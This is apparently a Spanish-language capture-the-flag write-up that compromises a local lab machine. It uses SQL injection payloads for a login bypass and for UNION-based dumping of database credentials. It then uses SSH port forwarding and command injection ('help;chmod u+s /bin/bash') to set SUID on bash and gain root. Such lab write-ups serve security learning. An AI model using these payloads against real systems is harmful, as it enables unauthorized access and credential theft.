## Reconocimiento:

Puerto 22 : SSH

Puerto 80 : HTTP

```bash
http://172.17.0.2/login.php
```

Hay un panel de login vulnerable a una inyección sql básica:

```bash
User: ' OR 1=1-- -
Pass: ' OR 1=1-- -
```

Entramos a un Dashboard.php, donde hay varios campos para un input. Si en los 2 primeros inserto ‘ OR 1=1— - sale el siguiente mensaje:

```bash
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1 in /var/www/html/dashboard.php:16 Stack trace: #0 /var/www/html/dashboard.php(16): mysqli_query() #1 {main} thrown in /var/www/html/dashboard.php on line 16
```

Nos revela que es vulnerable a una injección y la información de la base de datos.

La idea aquí es investigar cuantas columnas tiene para poder realizar la injección. En el parametro “Search Artworks” le dareamos la siguiente consulta:

```bash
' ORDER BY 5-- -
```

No da error, pero si fuera 6 si. Confirmando así que tiene 5.

Ahora paso a probar lo siguiente:

```bash
' UNION SELECT null, database(), null, null, null-- -
```

Funciona ya que revela otro recuadro con el nombre de  la base de datos: gallery_db.

Confirmamos que la segunda opción del SELECT es vulnerable y se enumeran las tablas dentro de gallery_db:

```bash
' UNION SELECT null, table_name, null, null, null FROM information_schema.tables WHERE table_schema=database()-- -
```

Revelando dos tablas:

```bash
artworks
users
```

```bash
' UNION SELECT null, column_name, null, null, null FROM information_schema.columns WHERE table_name='users'-- -
```

Info:

```bash
id
password
username
```

Viendo que tiene 3 columnas dumpeo la tabla:

```bash
' UNION SELECT null, CONCAT(username, ':', password), null, null, null FROM users-- -
```

Nos revela unas credenciales:

```bash
admin:2O]L)W{6c>Xx=Eu2#SV82%O%$#W}b3<
```

Pero no sirven de mucho, toca listar todas las tablas:

```bash
' UNION SELECT null, schema_name, null, null, null FROM information_schema.schemata-- -
```

Encuentro la tabla secret, y toca ver cuantas columnas tiene:

```bash
' UNION SELECT null, column_name, null, null, null FROM information_schema.columns WHERE table_schema='secret_db' AND table_name='secret'-- -
```

Info:

```bash
id
ssh_pass
ssh_users
```

Las dumpeo:

```bash
' UNION SELECT id, ssh_users, ssh_pass, null, null FROM secret_db.secret-- -
```

Encontramos las credenciales del  usuario sam para ssh:

```bash
sam:$uper$ecretP4$$w0rd123
ssh sam@172.17.0.2
```

## Escalada

No encuentro nada común, queriendo ver los puertos que corren en la maquina local me doy cuenta de que no hay herramientas comunes como ss o netstat, pero hay nmap:

```bash
nmap -p- 127.0.0.1
```

Revela algo interesante en el puerto 8888.

Hago una técnica llamada Port Forwarding pasando el puerto a nuestra maquina host:

```bash
#Desde el host
ssh sam@172.17.0.2 -L 8888:localhost:8888
```

Así redirijo el flujo del puerto a la máquina host, en el buscador pongo:

```bash
http://localhost:8888
```

Dentro hay una shell restringida, que tiene sus propios comandos y no se puede hacer mucho. Pero con help y  agregando “;” para concatenar vemos que funciona  deja ejecutar cualquier comando.

Viendo que todo lo ejecuta como root, toca establecer la bash con permisos SUID:

```bash
help;chmod u+s /bin/bash
```

Ahora en el servidor:

```bash
ls -la /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Funcionó 

```bash
bash -p
```

Listo.
